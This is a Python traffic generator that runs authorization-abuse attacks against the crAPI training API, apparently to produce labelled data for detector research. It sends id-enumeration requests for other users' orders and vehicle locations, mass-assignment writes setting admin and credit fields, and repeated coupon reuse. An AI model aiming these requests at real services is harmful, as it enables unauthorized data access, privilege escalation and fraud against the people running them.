"""crAPI context attacks — bola_idor, mass_assignment, business_logic_abuse.

Each individual request looks legitimate: a valid token, a well-formed body. Only the
application's authorization and business context reveals the abuse, so a per-request detector
cannot be expected to catch them. They are generated from a real attacker account and labeled
from the campaign manifest, never from content.

- bola_idor: a valid user enumerates other users' orders, vehicle locations and posts by id.
  This is OWASP API1, broken object level authorization.
- mass_assignment: otherwise valid writes carrying extra privileged fields such as role,
  is_admin and available_credit. OWASP API3.
- business_logic_abuse: reusing one coupon far beyond its intended single use. OWASP API6.
"""

import argparse
import os
import random
import string
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.manifest import now_iso, write_manifest  # noqa: E402
from common.uas import REALISTIC_UAS  # noqa: E402


def rand_id(rng, n=22):
    return "".join(rng.choices(string.ascii_letters + string.digits, k=n))


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--family", required=True,
                    choices=["bola_idor", "mass_assignment", "business_logic_abuse"])
    ap.add_argument("--manifest-dir", required=True)
    ap.add_argument("--campaign-id", required=True)
    ap.add_argument("--src-ip", required=True)
    ap.add_argument("--n", type=int, default=120)
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()

    # per-family seed, so two families never collide on the same crAPI phone number.
    # crAPI rejects a duplicate number with 403 "Number already registered"
    rng = random.Random(args.seed + sum(ord(c) for c in args.family))
    base = args.target.rstrip("/")
    start_ts = now_iso()
    sent = 0

    # a real, valid attacker account. The email/number carry a unique per-invocation token
    # so they never collide with accounts left in crAPI's persistent DB by earlier runs;
    # crAPI rejects a duplicate email or number with 403. The ATTACK ACTIONS below stay
    # seeded/deterministic — only the throwaway account identity varies, which is irrelevant
    # to the attack traffic. Each attempt draws a fresh identity until signup+login succeed.
    # Keep the email SHORT: crAPI stores the JWT in a varchar(500) column and a long email
    # inflates the token past 500 -> login 500s. A short unique identity avoids both that and
    # cross-run collisions in crAPI's persistent DB.
    import time as _t
    pw = f"Atk!{rng.randint(10000,99999)}"
    tok = None
    for attempt in range(8):
        uniq = f"{int(_t.time()*1000) % 10_000_000_000}{os.getpid() % 100}{attempt}"
        email = f"a{uniq}@x.co"
        number = f"4{uniq[-9:]}"
        s = requests.post(base + "/identity/api/auth/signup",
                          json={"name": f"atk-{args.family}"[:40], "email": email,
                                "number": number, "password": pw}, timeout=15)
        r = requests.post(base + "/identity/api/auth/login",
                          json={"email": email, "password": pw}, timeout=15)
        try:
            if r.status_code == 200 and r.json().get("token"):
                tok = r.json()["token"]
                break
        except Exception:
            pass
        uniq = f"{int(_t.time()*1000)}{os.getpid()}{attempt}"
        _t.sleep(1)
    if not tok:
        print(f"[crapi-context:{args.family}] could not obtain attacker token "
              f"(last signup={s.status_code})", file=sys.stderr)
        return 3

    def hdr():
        return {"User-Agent": rng.choice(REALISTIC_UAS), "Authorization": f"Bearer {tok}",
                "Content-Type": "application/json"}

    def go(method, path, **kw):
        nonlocal sent
        try:
            requests.request(method, base + path, headers=hdr(), timeout=12, **kw)
            sent += 1
        except requests.RequestException:
            pass

    fam = args.family
    for i in range(args.n):
        if fam == "bola_idor":
            # enumerate other users' objects with a valid token
            choice = i % 3
            if choice == 0:
                go("GET", f"/workshop/api/shop/orders/{rng.randint(1, 500)}")
            elif choice == 1:
                go("GET", f"/identity/api/v2/vehicle/{rand_id(rng, 36)}/location")
            else:
                go("GET", f"/community/api/v2/community/posts/{rand_id(rng)}")
        elif fam == "mass_assignment":
            # valid-looking writes with extra privileged fields
            go("POST", "/community/api/v2/community/posts",
               json={"title": f"post{i}", "content": "hi", "authorid": rng.randint(1, 999),
                     "role": "admin", "is_admin": True, "available_credit": 999999})
        else:  # business_logic_abuse — reuse the same coupon repeatedly
            go("POST", "/community/api/v2/coupon/validate-coupon",
               json={"coupon_code": "TRAC075"})

    end_ts = now_iso()
    write_manifest(
        out_dir=args.manifest_dir, campaign_id=args.campaign_id, app="crapi",
        label="attack", attack_family=fam, attack_tool="custom",
        src_ip=args.src_ip, start_ts=start_ts, end_ts=end_ts,
        extra={"seed": args.seed, "rows_sent": sent, "attacker": email},
    )
    print(f"[crapi-context:{fam}] sent {sent}, window [{start_ts},{end_ts}]", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
